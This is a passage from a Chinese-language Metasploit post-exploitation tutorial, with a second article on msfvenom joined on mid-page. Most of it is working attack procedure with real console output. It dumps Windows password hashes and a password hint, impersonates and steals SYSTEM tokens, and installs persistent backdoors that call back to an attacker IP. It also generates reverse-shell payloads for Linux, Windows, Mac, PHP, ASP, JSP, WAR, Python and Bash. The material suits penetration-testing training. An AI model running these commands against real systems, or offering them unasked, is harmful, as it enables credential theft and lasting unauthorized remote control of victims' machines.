<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

<p>3.post/windows/gather/smart_hashdump</p>
<p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

<p>4.powerdump<br>同 hashdump，但失败了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌"><a href="#4-7-假冒令牌" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门"><a href="#4-8-植入后门" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3><p>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。</p>
<p>1.persistence启动项后门</p>
<p>路径：metasploit/scripts/meterpreter/persistence</p>
<p>原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

<p>能实现同样功能的脚本还有：exploit/windows/local/persistence</p>
<p>2.metsvc服务后门</p>
<p>在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

<p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p>
<p>3.persistence_exe</p>
<p>再来看看官方推荐的东西吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

<p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p>
<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
<p>尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

<p>4.registry_persistence</p>
<p>完整路径为exploit/windows/local/registry_persistence</p>
<p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

<p>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-1"><a href="#2-msf基本命令-1" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-1"><a href="#3-msfvenom生成payload-1" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

